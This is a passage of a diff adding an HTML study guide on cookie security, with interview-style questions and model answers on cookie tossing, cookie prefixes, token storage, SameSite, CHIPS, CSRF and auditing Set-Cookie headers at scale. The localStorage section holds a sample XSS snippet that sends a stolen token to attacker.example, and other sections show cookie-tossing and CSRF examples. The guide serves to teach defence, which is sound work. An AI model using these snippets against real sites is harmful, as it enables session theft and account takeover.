+</blockquote>
+<hr />
+<h1 id="4-what-is-cookie-tossing-and-how-do-the-__host-and-__secure-prefixes-prevent-it">4. What is cookie tossing and how do the <code>__Host-</code> and <code>__Secure-</code> prefixes prevent it?</h1>
+<p><strong>Cookie tossing</strong> is an attack where a less trusted subdomain sets a cookie for a parent domain, causing the browser to send attacker-controlled cookies to a more sensitive sibling or parent application.</p>
+<h2 id="example-attack">Example attack</h2>
+<p>Attacker controls or compromises:</p>
+<pre><code class="language-text">evil.example.com
+</code></pre>
+<p>It sets:</p>
+<pre><code class="language-http">Set-Cookie: session=attacker_value; Domain=example.com; Path=/
+</code></pre>
+<p>Now when the victim visits:</p>
+<pre><code class="language-text">https://www.example.com
+</code></pre>
+<p>the browser may send both legitimate and attacker-injected cookies, depending on name/path/domain interactions.</p>
+<p>This can cause:</p>
+<ul>
+<li>Session fixation</li>
+<li>Login confusion</li>
+<li>Forced logout</li>
+<li>App parsing the wrong cookie</li>
+<li>CSRF token confusion</li>
+<li>Authentication bypass in badly implemented systems</li>
+</ul>
+<h2 id="__secure-prefix"><code>__Secure-</code> prefix</h2>
+<p>A cookie named with <code>__Secure-</code> must be set over HTTPS and must include the <code>Secure</code> attribute. MDN documents this prefix requirement. (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com" title="Set-Cookie header - HTTP - MDN Web Docs">MDN Web Docs</a>)</p>
+<p>Example:</p>
+<pre><code class="language-http">Set-Cookie: __Secure-session=abc; Secure; HttpOnly; SameSite=Lax; Domain=example.com; Path=/
+</code></pre>
+<p>This prevents insecure HTTP origins from setting it, but it does <strong>not</strong> prevent subdomain cookie tossing if <code>Domain=example.com</code> is still allowed.</p>
+<h2 id="__host-prefix"><code>__Host-</code> prefix</h2>
+<p>A cookie named with <code>__Host-</code> must:</p>
+<ul>
+<li>Be set over HTTPS</li>
+<li>Include <code>Secure</code></li>
+<li>Have <code>Path=/</code></li>
+<li><strong>Not</strong> include a <code>Domain</code> attribute</li>
+</ul>
+<p>MDN notes that <code>__Host-</code> cookies must not specify <code>Domain</code>, so they are not sent to subdomains. (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com" title="Set-Cookie header - HTTP - MDN Web Docs">MDN Web Docs</a>)</p>
+<p>Example:</p>
+<pre><code class="language-http">Set-Cookie: __Host-session=abc; Secure; HttpOnly; SameSite=Lax; Path=/
+</code></pre>
+<p>This is stronger because a subdomain cannot set a parent-domain <code>__Host-session</code> cookie.</p>
+<h2 id="comparison_1">Comparison</h2>
+<table>
+<thead>
+<tr>
+<th>Prefix</th>
+<th style="text-align: right;">Requires HTTPS</th>
+<th style="text-align: right;">Requires <code>Secure</code></th>
+<th style="text-align: right;">Forbids <code>Domain</code></th>
+<th style="text-align: right;">Requires <code>Path=/</code></th>
+<th style="text-align: right;">Protects against subdomain cookie tossing</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__Secure-</code></td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">No</td>
+<td style="text-align: right;">No</td>
+<td style="text-align: right;">Partially</td>
+</tr>
+<tr>
+<td><code>__Host-</code></td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">Strongly</td>
+</tr>
+</tbody>
+</table>
+<h3 id="model-answer_3">Model answer</h3>
+<blockquote>
+<p>Cookie tossing happens when a subdomain injects a parent-domain cookie that collides with a sensitive app’s cookie. <code>__Secure-</code> ensures the cookie was set securely over HTTPS, but <code>__Host-</code> is stronger because it forbids the <code>Domain</code> attribute and requires <code>Path=/</code>, binding the cookie to the exact host and preventing subdomains from setting it.</p>
+</blockquote>
+<hr />
+<h1 id="5-why-is-storing-a-session-token-in-localstorage-generally-worse-than-storing-it-in-an-httponly-cookie">5. Why is storing a session token in <code>localStorage</code> generally worse than storing it in an <code>HttpOnly</code> cookie?</h1>
+<p><code>localStorage</code> is readable by JavaScript running on the origin. An <code>HttpOnly</code> cookie is not.</p>
+<h2 id="main-difference">Main difference</h2>
+<pre><code class="language-javascript">// If token is in localStorage, XSS can do this:
+const token = localStorage.getItem(&quot;access_token&quot;);
+fetch(&quot;https://attacker.example/steal&quot;, {
+  method: &quot;POST&quot;,
+  body: token,
+});
+</code></pre>
+<p>If the token is in an <code>HttpOnly</code> cookie, XSS cannot directly read the cookie value through JavaScript. (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com" title="Set-Cookie header - HTTP - MDN Web Docs">MDN Web Docs</a>)</p>
+<h2 id="risk-comparison">Risk comparison</h2>
+<table>
+<thead>
+<tr>
+<th>Storage location</th>
+<th style="text-align: right;">Direct theft by XSS</th>
+<th style="text-align: right;">Automatically sent</th>
+<th style="text-align: right;">CSRF risk</th>
+<th>Common use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>localStorage</code></td>
+<td style="text-align: right;">High</td>
+<td style="text-align: right;">No</td>
+<td style="text-align: right;">Lower by default</td>
+<td>SPA token storage</td>
+</tr>
+<tr>
+<td>Non-HttpOnly cookie</td>
+<td style="text-align: right;">High</td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">Higher</td>
+<td>Bad session pattern</td>
+</tr>
+<tr>
+<td><code>HttpOnly; Secure; SameSite</code> cookie</td>
+<td style="text-align: right;">Lower</td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">Must control with SameSite/CSRF protections</td>
+<td>Traditional web sessions</td>
+</tr>
+</tbody>
+</table>
+<h2 id="why-localstorage-is-usually-worse-for-session-tokens">Why <code>localStorage</code> is usually worse for session tokens</h2>
+<ul>
+<li>Any XSS can steal the token directly.</li>
+<li>Tokens often survive browser restarts.</li>
+<li>Tokens are accessible to all scripts on the origin, including compromised third-party scripts.</li>
+<li>Exfiltrated bearer tokens can be replayed from attacker infrastructure.</li>
+<li>Logout and revocation are often poorly implemented.</li>
+<li>Browser security attributes like <code>HttpOnly</code> and <code>SameSite</code> do not apply to <code>localStorage</code>.</li>
+</ul>
+<h2 id="important-nuance">Important nuance</h2>
+<p>An <code>HttpOnly</code> cookie does not make XSS harmless. XSS can still act as the user from inside the browser. But it usually makes <strong>offline token theft and replay</strong> harder.</p>
+<h3 id="model-answer_4">Model answer</h3>
+<blockquote>
+<p><code>localStorage</code> is generally worse for session tokens because XSS can read and exfiltrate the token directly. An <code>HttpOnly</code> cookie cannot be read by JavaScript, so XSS can still perform actions as the user, but it is harder to steal the bearer token and replay it elsewhere. The best answer is not just “cookie good, localStorage bad”; it is to combine <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, CSRF protection, short lifetimes, rotation, and XSS prevention.</p>
+</blockquote>
+<hr />
+<h1 id="6-what-is-the-order-of-priority-for-max-age-vs-expires-if-both-are-set-on-a-cookie">6. What is the order of priority for <code>Max-Age</code> vs <code>Expires</code> if both are set on a cookie?</h1>
+<p>If both <code>Max-Age</code> and <code>Expires</code> are set, <strong><code>Max-Age</code> takes precedence</strong>. RFC 6265 states that when both attributes are present, <code>Max-Age</code> controls the expiration date. (<a href="https://datatracker.ietf.org/doc/html/rfc6265?utm_source=chatgpt.com" title="RFC 6265 - HTTP State Management Mechanism">IETF Datatracker</a>)</p>
+<p>Example:</p>
+<pre><code class="language-http">Set-Cookie: session=abc; Max-Age=3600; Expires=Wed, 01 Jan 2030 00:00:00 GMT; Secure; HttpOnly
+</code></pre>
+<p>The cookie expires in <strong>3600 seconds</strong>, not in 2030.</p>
+<h2 id="why-max-age-is-preferred">Why <code>Max-Age</code> is preferred</h2>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Meaning</th>
+<th>Risk</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Expires</code></td>
+<td>Absolute timestamp</td>
+<td>Clock skew issues</td>
+</tr>
+<tr>
+<td><code>Max-Age</code></td>
+<td>Relative seconds from now</td>
+<td>More deterministic</td>
+</tr>
+</tbody>
+</table>
+<h2 id="session-cookie-behavior">Session cookie behavior</h2>
+<p>If neither is set:</p>
+<pre><code class="language-http">Set-Cookie: session=abc; Secure; HttpOnly
+</code></pre>
+<p>then it is a session cookie and is retained until the browser-defined session ends. RFC 6265 describes this behavior when neither <code>Max-Age</code> nor <code>Expires</code> exists. (<a href="https://datatracker.ietf.org/doc/html/rfc6265?utm_source=chatgpt.com" title="RFC 6265 - HTTP State Management Mechanism">IETF Datatracker</a>)</p>
+<h3 id="model-answer_5">Model answer</h3>
+<blockquote>
+<p><code>Max-Age</code> wins over <code>Expires</code>. If both are present, the browser uses <code>Max-Age</code>. Security-wise, I prefer explicit short <code>Max-Age</code> for session management and server-side revocation rather than relying only on long client-side expiration.</p>
+</blockquote>
+<hr />
+<h1 id="7-how-does-samesitenone-secure-interact-with-third-party-cookie-deprecation">7. How does <code>SameSite=None; Secure</code> interact with third-party cookie deprecation?</h1>
+<p><code>SameSite=None; Secure</code> is the required syntax for cookies that need to be sent in cross-site contexts. Google’s developer documentation says cookies marked <code>SameSite=None</code> must also use <code>Secure</code>. (<a href="https://developers.google.com/search/blog/2020/01/get-ready-for-new-samesitenone-secure?utm_source=chatgpt.com" title="Get Ready for New SameSite=None; Secure Cookie Settings">Google for Developers</a>)</p>
+<p>Example:</p>
+<pre><code class="language-http">Set-Cookie: widget_session=abc; SameSite=None; Secure; HttpOnly; Path=/
+</code></pre>
+<p>This means:</p>
+<ul>
+<li>The cookie may be sent in cross-site contexts.</li>
+<li>It must only be sent over HTTPS.</li>
+<li>It is eligible for third-party usage, subject to browser policy.</li>
+</ul>
+<h2 id="but-third-party-cookie-deprecation-changes-the-picture">But third-party cookie deprecation changes the picture</h2>
+<p>Historically, <code>SameSite=None; Secure</code> enabled third-party cookies for use cases like:</p>
+<ul>
+<li>Embedded login widgets</li>
+<li>Payment iframes</li>
+<li>Chat widgets</li>
+<li>SaaS integrations</li>
+<li>Federated flows</li>
+<li>Cross-site personalization</li>
+</ul>
+<p>But browsers are reducing or blocking unrestricted third-party cookies to limit cross-site tracking. Chrome’s Privacy Sandbox describes third-party cookie phaseout as an effort to reduce cross-site tracking while supporting use cases through newer technologies. (<a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/RG0oLYQ0f2I/m/xMSdsEAzBwAJ?utm_source=chatgpt.com" title="Intent to Deprecate &amp; Remove: Third-Party Cookies">Google Groups</a>)</p>
+<p>So:</p>
+<pre><code class="language-http">SameSite=None; Secure
+</code></pre>
+<p>is necessary for cross-site cookies, but no longer guarantees that the browser will allow unrestricted third-party cookie behavior.</p>
+<h2 id="practical-implication">Practical implication</h2>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Old model</th>
+<th>Newer model</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Third-party iframe stores global cookie</td>
+<td><code>SameSite=None; Secure</code> works broadly</td>
+<td>May be blocked or partitioned</td>
+</tr>
+<tr>
+<td>Embedded widget needs per-site state</td>
+<td>Third-party cookie</td>
+<td>CHIPS / partitioned cookie</td>
+</tr>
+<tr>
+<td>Federated login</td>
+<td>Third-party cookie-based flows</td>
+<td>FedCM / top-level redirects / Storage Access API depending on case</td>
+</tr>
+<tr>
+<td>Cross-site tracking</td>
+<td>Third-party cookie</td>
+<td>Intentionally reduced</td>
+</tr>
+</tbody>
+</table>
+<h3 id="model-answer_6">Model answer</h3>
+<blockquote>
+<p><code>SameSite=None; Secure</code> marks a cookie as cross-site capable and HTTPS-only. But with third-party cookie deprecation, that does not mean the cookie will behave as a global third-party identifier across sites. Browsers are moving toward partitioned or purpose-built alternatives such as CHIPS, Storage Access API, and FedCM-style patterns.</p>
+</blockquote>
+<hr />
+<h1 id="8-what-is-chips-cookie-partitioning-and-why-are-browsers-implementing-it">8. What is CHIPS, cookie partitioning, and why are browsers implementing it?</h1>
+<p><strong>CHIPS</strong> means <strong>Cookies Having Independent Partitioned State</strong>. It allows a third-party cookie to be partitioned by the top-level site, so the same embedded third-party service gets a separate cookie jar per top-level website. Google’s Privacy Sandbox says CHIPS lets developers opt a cookie into partitioned storage with separate cookie jars per top-level site. (<a href="https://privacysandbox.google.com/cookies/chips?utm_source=chatgpt.com" title="Cookies Having Independent Partitioned State (CHIPS)">Privacy Sandbox</a>)</p>
+<p>MDN describes partitioned cookies as being double-keyed by the origin that sets them and the top-level page origin. (<a href="https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies?utm_source=chatgpt.com" title="Cookies Having Independent Partitioned State (CHIPS)">MDN Web Docs</a>)</p>
+<h2 id="example_2">Example</h2>
+<p>Suppose <code>chat.example</code> is embedded on two sites:</p>
+<pre><code class="language-text">news.com
+shop.com
+</code></pre>
+<p>Without partitioning:</p>
+<pre><code class="language-text">chat.example cookie = same value across news.com and shop.com
+</code></pre>
+<p>This enables cross-site tracking.</p>
+<p>With CHIPS:</p>
+<pre><code class="language-text">(news.com, chat.example) cookie = value A
+(shop.com, chat.example) cookie = value B
+</code></pre>
+<p>The embedded service can maintain state inside each site, but cannot use one shared cookie to track the user across unrelated sites.</p>
+<h2 id="example-header">Example header</h2>
+<pre><code class="language-http">Set-Cookie: __Host-widget_session=abc; Secure; HttpOnly; SameSite=None; Path=/; Partitioned
+</code></pre>
+<p>The <code>Partitioned</code> attribute opts the cookie into partitioned storage. MDN and Chrome documentation note that <code>Partitioned</code> cookies require <code>Secure</code>. (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com" title="Set-Cookie header - HTTP - MDN Web Docs">MDN Web Docs</a>)</p>
+<h2 id="why-browsers-implement-it">Why browsers implement it</h2>
+<p>Browsers are trying to preserve legitimate embedded use cases while reducing cross-site tracking.</p>
+<p>Legitimate use cases:</p>
+<ul>
+<li>Embedded chat widget</li>
+<li>Payment provider iframe</li>
+<li>SaaS support widget</li>
+<li>CDN load balancing</li>
+<li>Embedded maps</li>
+<li>Per-site preferences for third-party widgets</li>
+</ul>
+<p>Risk being reduced:</p>
+<pre><code class="language-text">One third-party cookie tracking the same user across thousands of unrelated sites
+</code></pre>
+<h3 id="model-answer_7">Model answer</h3>
+<blockquote>
+<p>CHIPS partitions third-party cookies by top-level site. It allows embedded third-party services to keep per-site state without receiving a single global identifier across the web. Browsers are implementing it to support legitimate third-party embeds while reducing cross-site tracking.</p>
+</blockquote>
+<hr />
+<h1 id="9-a-developer-sets-samesitelax-but-claims-this-fully-prevents-csrf-name-one-csrf-scenario-lax-does-not-prevent">9. A developer sets <code>SameSite=Lax</code> but claims this fully prevents CSRF. Name one CSRF scenario <code>Lax</code> does not prevent.</h1>
+<p><code>SameSite=Lax</code> does <strong>not</strong> fully prevent CSRF.</p>
+<p>One important scenario is a <strong>state-changing GET endpoint</strong> triggered by a top-level cross-site navigation.</p>
+<p>Example vulnerable endpoint:</p>
+<pre><code class="language-http">GET /account/delete
+</code></pre>
+<p>If the session cookie is <code>SameSite=Lax</code>, and a victim clicks or is redirected to:</p>
+<pre><code class="language-html">&lt;a href=&quot;https://bank.example/account/delete&quot;&gt;Click here&lt;/a&gt;
+</code></pre>
+<p>or:</p>
+<pre><code class="language-html">&lt;script&gt;
+  location.href = &quot;https://bank.example/account/delete&quot;;
+&lt;/script&gt;
+</code></pre>
+<p>the browser may send the <code>Lax</code> cookie because this is a top-level navigation using a safe method such as GET. MDN states that <code>Lax</code> includes top-level navigations with safe methods. (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com" title="Set-Cookie header - HTTP - MDN Web Docs">MDN Web Docs</a>)</p>
+<h2 id="why-this-matters">Why this matters</h2>
+<p><code>SameSite=Lax</code> assumes safe methods like GET do not change state. If the application violates HTTP semantics and performs state-changing actions on GET, <code>Lax</code> can be bypassed.</p>
+<h2 id="other-scenarios-where-lax-is-insufficient">Other scenarios where <code>Lax</code> is insufficient</h2>
+<ul>
+<li>Login CSRF</li>
+<li>OAuth / SSO flow manipulation</li>
+<li>Top-level GET state changes</li>
+<li>Browser-specific grace behavior around recently set cookies</li>
+<li>Same-site but cross-origin attacks, for example compromised sibling subdomain</li>
+<li>XSS, which bypasses CSRF protections by running inside the site</li>
+</ul>
+<h2 id="correct-controls">Correct controls</h2>
+<p>Use:</p>
+<ul>
+<li>CSRF tokens for state-changing actions</li>
+<li><code>Origin</code> / <code>Referer</code> validation</li>
+<li>No state changes on GET</li>
+<li><code>SameSite=Strict</code> for sensitive cookies or sensitive flows</li>
+<li>Re-authentication for critical actions</li>
+<li>Step-up MFA for high-risk actions</li>
+</ul>
+<h3 id="model-answer_8">Model answer</h3>
+<blockquote>
+<p><code>SameSite=Lax</code> does not prevent CSRF against state-changing GET endpoints because cookies are sent on top-level safe-method navigations. If <code>/delete-account</code> or <code>/transfer/confirm</code> changes state via GET, an attacker can trigger it through a cross-site navigation. <code>SameSite</code> is not a replacement for correct HTTP method design and CSRF tokens.</p>
+</blockquote>
+<hr />
+<h1 id="10-at-google-scale-how-would-you-audit-millions-of-set-cookie-headers-across-thousands-of-services-to-ensure-all-session-cookies-have-httponly-secure-and-appropriate-samesite-values">10. At Google scale, how would you audit millions of <code>Set-Cookie</code> headers across thousands of services to ensure all session cookies have <code>HttpOnly</code>, <code>Secure</code>, and appropriate <code>SameSite</code> values?</h1>
+<p>At Google scale, I would not solve this with manual reviews. I would build a <strong>cookie governance control plane</strong> combining static analysis, runtime telemetry, policy-as-code, service ownership, automated enforcement, and exception management.</p>
+<p>The goal is:</p>
+<pre><code class="language-text">Every session cookie is discoverable, classified, owned, policy-checked, and continuously monitored.
+</code></pre>
+<hr />
+<h2 id="high-level-architecture">High-level architecture</h2>
+<pre class="mermaid">
+flowchart TD
+    A[Service Source Code] --> B[Static Cookie Scanner]
+    C[CI/CD Build Artifacts] --> B
+    D[Runtime HTTP Traffic Sampling] --> E[Set-Cookie Parser]
+    F[Edge Proxy / Load Balancer Logs] --> E
+    G[Synthetic Crawlers] --> E
+    H[Browser Telemetry / RUM] --> E
+
+    B --> I[Cookie Inventory]
+    E --> I
+
+    I --> J[Cookie Classifier]
+    J --> K[Policy Engine]
+    K --> L[Violations Dashboard]
+    K --> M[CI/CD Blocking]
+    K --> N[Service Owner Tickets]
+    K --> O[SIEM Alerts]
+
+    P[Exception Registry] --> K
+    Q[Service Catalog / Ownership] --> I
+</pre>
+<hr />
+<h2 id="step-1-define-cookie-security-policy">Step 1: Define cookie security policy</h2>
+<p>Example policy:</p>
+<pre><code class="language-yaml">cookie_policy:
+  session_cookie:
+    required:
+      - Secure
+      - HttpOnly
+      - SameSite
+    allowed_samesite:
+      - Lax
+      - Strict
+    disallowed:
+      - Domain unless explicitly approved
+      - SameSite=None unless third_party_use_case_approved
+    recommended:
+      - __Host- prefix
+      - Path=/
+      - short Max-Age
+</code></pre>
+<p>For third-party cookies:</p>
+<pre><code class="language-yaml">third_party_cookie:
+  required:
+    - Secure
+    - SameSite=None
+  review_required:
+    - business_justification
+    - privacy_review
+    - CHIPS_or_alternative_assessment
+</code></pre>
+<hr />
+<h2 id="step-2-build-a-global-cookie-inventory">Step 2: Build a global cookie inventory</h2>
+<p>Collect <code>Set-Cookie</code> headers from multiple sources.</p>
+<table>
+<thead>
+<tr>
+<th>Source</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Edge proxies</td>
+<td>Real production responses</td>
+</tr>
+<tr>
+<td>API gateways</td>
+<td>Service-level visibility</td>
+</tr>
+<tr>
+<td>CDN logs</td>
+<td>Public web coverage</td>
+</tr>
+<tr>
+<td>Synthetic crawlers</td>
+<td>Authenticated and unauthenticated journeys</td>
+</tr>
+<tr>
+<td>Browser telemetry</td>
+<td>What users actually receive</td>
+</tr>
+<tr>
+<td>CI/CD scans</td>
+<td>Prevent new bad cookies</td>
+</tr>
+<tr>
+<td>Source code search</td>
+<td>Find framework-level cookie setters</td>
+</tr>
+<tr>
+<td>Service mesh</td>
+<td>Internal service cookies</td>
+</tr>
+<tr>
+<td>Mobile webviews</td>
+<td>Catch non-browser clients</td>
+</tr>
+</tbody>
+</table>
+<p>Inventory schema:</p>
+<pre><code class="language-json">{
+  &quot;cookie_name&quot;: &quot;__Host-session&quot;,
+  &quot;service&quot;: &quot;checkout-web&quot;,
+  &quot;owner&quot;: &quot;payments-platform&quot;,
+  &quot;environment&quot;: &quot;prod&quot;,
+  &quot;domain&quot;: &quot;checkout.example.com&quot;,
+  &quot;path&quot;: &quot;/&quot;,
+  &quot;secure&quot;: true,
+  &quot;httpOnly&quot;: true,
+  &quot;sameSite&quot;: &quot;Lax&quot;,
+  &quot;maxAge&quot;: 3600,
+  &quot;expires&quot;: null,
+  &quot;hasDomainAttribute&quot;: false,
+  &quot;prefix&quot;: &quot;__Host-&quot;,
+  &quot;first_seen&quot;: &quot;2026-05-11T10:00:00Z&quot;,
+  &quot;last_seen&quot;: &quot;2026-05-11T10:30:00Z&quot;,
+  &quot;sample_source&quot;: &quot;edge_proxy&quot;
+}
+</code></pre>
+<hr />
+<h2 id="step-3-classify-session-cookies">Step 3: Classify session cookies</h2>
+<p>Not every cookie is a session cookie. Classification is hard at scale.</p>
+<p>Signals:</p>
+<table>
+<thead>
+<tr>
+<th>Signal</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cookie name</td>
+<td><code>session</code>, <code>sid</code>, <code>auth</code>, <code>token</code>, <code>jwt</code>, <code>sso</code></td>
+</tr>
+<tr>
+<td>Value shape</td>
+<td>JWT, opaque random token, encrypted blob</td>
+</tr>
+<tr>
+<td>Endpoint</td>
+<td>Set after <code>/login</code>, <code>/oauth/callback</code>, <code>/sso</code></td>
+</tr>
+<tr>
+<td>Lifetime</td>
+<td>Short or medium duration</td>
+</tr>
+<tr>
+<td>Access pattern</td>
+<td>Sent to authenticated endpoints</td>
+</tr>
+<tr>
+<td>Backend mapping</td>
+<td>Tied to session store</td>
+</tr>
+<tr>
+<td>Code annotations</td>
+<td><code>@SessionCookie</code></td>
+</tr>
+<tr>
+<td>Identity provider</td>
+<td>Set by auth service</td>
+</tr>
+</tbody>
+</table>
+<p>Use classification levels:</p>
+<pre><code class="language-text">Definitely session
+Likely session
+Possibly sensitive
+Non-sensitive preference/analytics
+Unknown
+</code></pre>
+<p>Unknown cookies should be reviewed.</p>
+<hr />
+<h2 id="step-4-parse-and-validate-headers-correctly">Step 4: Parse and validate headers correctly</h2>
+<p>Cookie parsing must follow browser semantics, not naive string matching.</p>
+<p>Check:</p>
+<ul>
+<li><code>Secure</code></li>
+<li><code>HttpOnly</code></li>
+<li><code>SameSite</code></li>
+<li><code>Domain</code></li>
+<li><code>Path</code></li>
+<li><code>Max-Age</code></li>
+<li><code>Expires</code></li>
+<li>Prefix rules</li>
+<li><code>Partitioned</code></li>
+<li>Duplicate attributes</li>
+<li>Duplicate cookie names with different paths</li>
+<li>Invalid casing or malformed attributes</li>
+<li>Header folding/proxy transformations</li>
+<li>Framework defaults</li>
+</ul>
+<p>Example violation:</p>
+<pre><code class="language-http">Set-Cookie: session=abc; Path=/; SameSite=None
+</code></pre>
+<p>Findings:</p>
+<pre><code class="language-text">Missing Secure
+Missing HttpOnly
+SameSite=None requires Secure
+Session cookie not using __Host-
+</code></pre>
+<hr />
+<h2 id="step-5-enforce-in-cicd">Step 5: Enforce in CI/CD</h2>
+<p>Add build-time checks for common frameworks.</p>
+<p>For example, reject code that sets:</p>
+<pre><code class="language-javascript">res.cookie(&quot;session&quot;, token);
+</code></pre>
+<p>without:</p>
+<pre><code class="language-javascript">res.cookie(&quot;session&quot;, token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: &quot;lax&quot;,
+});
+</code></pre>
+<p>CI/CD gates:</p>
+<table>
+<thead>
+<tr>
+<th>Gate</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>New session cookie missing <code>Secure</code></td>
+<td>Block release</td>
+</tr>
+<tr>
+<td>New session cookie missing <code>HttpOnly</code></td>
+<td>Block release</td>
+</tr>
+<tr>
+<td><code>SameSite=None</code> without approved exception</td>
+<td>Block or require review</td>
+</tr>
+<tr>
+<td><code>Domain=.example.com</code> on session cookie</td>
+<td>High-severity review</td>
+</tr>
+<tr>
+<td>Non-<code>__Host-</code> session cookie on high-risk app</td>
+<td>Warning or policy violation</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="step-6-enforce-at-platform-layer">Step 6: Enforce at platform layer</h2>
+<p>At scale, many teams will make mistakes. Central platforms should provide safe defaults.</p>
+<p>Examples:</p>
+<ul>
+<li>Central auth library always sets secure cookies.</li>
+<li>API gateway rejects unsafe <code>Set-Cookie</code> for session names.</li>
+<li>Edge proxy appends or normalizes attributes where safe.</li>
+<li>Framework templates use secure defaults.</li>
+<li>Golden path libraries are mandatory for session creation.</li>
+</ul>
+<p>Example central library:</p>
+<pre><code class="language-java">Cookie session = CookieBuilder.name(&quot;__Host-session&quot;)
+    .value(token)
+    .secure(true)
+    .httpOnly(true)
+    .sameSite(&quot;Lax&quot;)
+    .path(&quot;/&quot;)
+    .maxAge(Duration.ofHours(1))
+    .build();
+</code></pre>
+<p>Important: blindly modifying cookies at the edge can break apps, especially around <code>SameSite=None</code>, domain/path scoping, and embedded flows. Prefer central libraries and policy enforcement.</p>
+<hr />
+<h2 id="step-7-runtime-detection-and-alerting">Step 7: Runtime detection and alerting</h2>
+<p>Runtime is the source of truth.</p>
+<p>Alert when production emits:</p>
+<pre><code class="language-text">Session cookie without Secure
+Session cookie without HttpOnly
+Session cookie with SameSite=None and no Secure
+Session cookie with Domain=parent domain
+Session cookie with long Max-Age
+Session cookie set over HTTP
+Session cookie name collision across subdomains
+Cookie prefix violation
+</code></pre>
+<p>Example SIEM rule:</p>
+<pre><code class="language-text">IF cookie.classification IN [&quot;definitely_session&quot;, &quot;likely_session&quot;]
+AND (cookie.secure = false OR cookie.httpOnly = false OR cookie.sameSite IS NULL)
+THEN severity = high
+</code></pre>
+<hr />
+<h2 id="step-8-exception-management">Step 8: Exception management</h2>
+<p>Some cookies legitimately need unusual behavior.</p>
+<p>Example:</p>
+<pre><code class="language-http">Set-Cookie: embed_session=abc; SameSite=None; Secure; Partitioned; HttpOnly
+</code></pre>
+<p>Exception records should include:</p>
+<pre><code class="language-json">{
+  &quot;cookie_name&quot;: &quot;embed_session&quot;,
+  &quot;service&quot;: &quot;support-widget&quot;,
+  &quot;owner&quot;: &quot;customer-platform&quot;,
+  &quot;reason&quot;: &quot;Third-party embedded support widget&quot;,
+  &quot;approved_by&quot;: &quot;AppSec + Privacy&quot;,
+  &quot;expires&quot;: &quot;2026-08-01&quot;,
+  &quot;required_controls&quot;: [&quot;Secure&quot;, &quot;HttpOnly&quot;, &quot;Partitioned&quot;]
+}
+</code></pre>
+<p>No permanent exceptions without re-review.</p>
+<hr />
+<h2 id="step-9-dashboards-and-accountability">Step 9: Dashboards and accountability</h2>
+<p>Metrics:</p>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Total session cookies</td>
+<td>Inventory coverage</td>
+</tr>
+<tr>
+<td><code>% with Secure</code></td>
+<td>Transport protection</td>
+</tr>
+<tr>
+<td><code>% with HttpOnly</code></td>
+<td>XSS token theft reduction</td>
+</tr>
+<tr>
+<td><code>% with SameSite</code></td>
+<td>CSRF posture</td>
+</tr>
+<tr>
+<td><code>% with Domain attribute</code></td>
+<td>Subdomain blast radius</td>
+</tr>
+<tr>
+<td>Violations by org</td>
+<td>Accountability</td>
+</tr>
+<tr>
+<td>Unknown cookies</td>
+<td>Classification gap</td>
+</tr>
+<tr>
+<td>Exceptions expiring soon</td>
+<td>Governance hygiene</td>
+</tr>
+<tr>
+<td>Time to remediate</td>
+<td>Operational maturity</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="step-10-rollout-strategy">Step 10: Rollout strategy</h2>
+<p>For millions of cookies, use staged enforcement:</p>
+<ol>
+<li>Discover and inventory.</li>
+<li>Classify and assign owners.</li>
+<li>Report-only mode.</li>
+<li>Fix central libraries.</li>
+<li>Block new violations in CI.</li>
+<li>Remediate existing high-risk cookies.</li>
+<li>Add runtime enforcement.</li>
+<li>Require exceptions for non-compliant cookies.</li>
+<li>Periodically re-audit.</li>
+</ol>
+<hr />
+<h2 id="model-answer_9">Model answer</h2>
+<blockquote>
+<p>At Google scale, I would create a cookie security control plane. It would collect <code>Set-Cookie</code> headers from edge traffic, service mesh, synthetic crawlers, browser telemetry, CI/CD, and source code. It would classify session cookies, parse attributes using browser-accurate semantics, check them against policy-as-code, map every cookie to a service owner, block new violations in CI/CD, alert on production violations, and manage short-lived exceptions. The key is moving from manual header review to continuous inventory, ownership, automated policy, and secure-by-default platform libraries.</p>
+</blockquote>
+<hr />
+<h1 id="final-senior-security-engineer-summary">Final Senior Security Engineer Summary</h1>
+<p>For secure session cookies, the baseline should be:</p>
+<pre><code class="language-http">Set-Cookie: __Host-session=&lt;opaque-random-value&gt;; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
+</code></pre>
+<p>For highly sensitive flows:</p>
+<pre><code class="language-http">Set-Cookie: __Host-admin_session=&lt;opaque-random-value&gt;; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=900
+</code></pre>
+<p>For legitimate third-party embedded use cases:</p>
